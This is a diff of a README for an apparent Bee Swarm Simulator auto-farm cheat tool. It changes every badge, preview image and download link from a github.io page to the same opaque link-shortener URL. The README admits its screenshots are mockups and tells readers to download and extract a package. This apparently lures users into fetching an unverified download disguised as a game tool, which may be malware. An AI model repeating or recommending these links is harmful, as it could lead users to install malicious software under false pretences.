@@ -12,32 +12,32 @@ Planters are an established Bee Swarm progression system used across fields and 
 
 ## Quick Access
 
-[![Bee Swarm](https://img.shields.io/badge/Bee%20Swarm-Auto%20Farm-e7b622?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Pollen](https://img.shields.io/badge/Pollen-Farm-c9a117?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Honey](https://img.shields.io/badge/Honey-Convert-d79521?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Quests](https://img.shields.io/badge/Quest-Helper-4fae58?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Planters](https://img.shields.io/badge/Planter-Nectar-875ac2?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-a67718?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Bee Swarm](https://img.shields.io/badge/Bee%20Swarm-Auto%20Farm-e7b622?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Pollen](https://img.shields.io/badge/Pollen-Farm-c9a117?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Honey](https://img.shields.io/badge/Honey-Convert-d79521?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Quests](https://img.shields.io/badge/Quest-Helper-4fae58?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Planters](https://img.shields.io/badge/Planter-Nectar-875ac2?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-a67718?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Bee Swarm Simulator Auto Farm](https://idleobstacle.github.io/)**
+➡️ **[Download Bee Swarm Simulator Auto Farm](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Bee Swarm Auto Farm Preview](assets/bee-swarm-auto-farm-preview.png)](https://idleobstacle.github.io/)
+[![Bee Swarm Auto Farm Preview](assets/bee-swarm-auto-farm-preview.png)](https://flyn.co/17yeN7/)
 
 ### Dashboard
 
-[![Bee Swarm Auto Farm Dashboard](assets/bee-swarm-auto-farm-dashboard.png)](https://idleobstacle.github.io/)
+[![Bee Swarm Auto Farm Dashboard](assets/bee-swarm-auto-farm-dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Farming Profiles
 
-[![Bee Swarm Farming Profiles](assets/bee-swarm-farming-profiles.png)](https://idleobstacle.github.io/)
+[![Bee Swarm Farming Profiles](assets/bee-swarm-farming-profiles.png)](https://flyn.co/17yeN7/)
 
 > Interface images are project mockups.
 
@@ -214,7 +214,7 @@ Profiles can store:
 
 1. Download the current package:
 
-   **[Download Bee Swarm Simulator Auto Farm](https://idleobstacle.github.io/)**
+   **[Download Bee Swarm Simulator Auto Farm](https://flyn.co/17yeN7/)**
 
 2. Extract it into a dedicated folder.
 3. Read the current project notes.
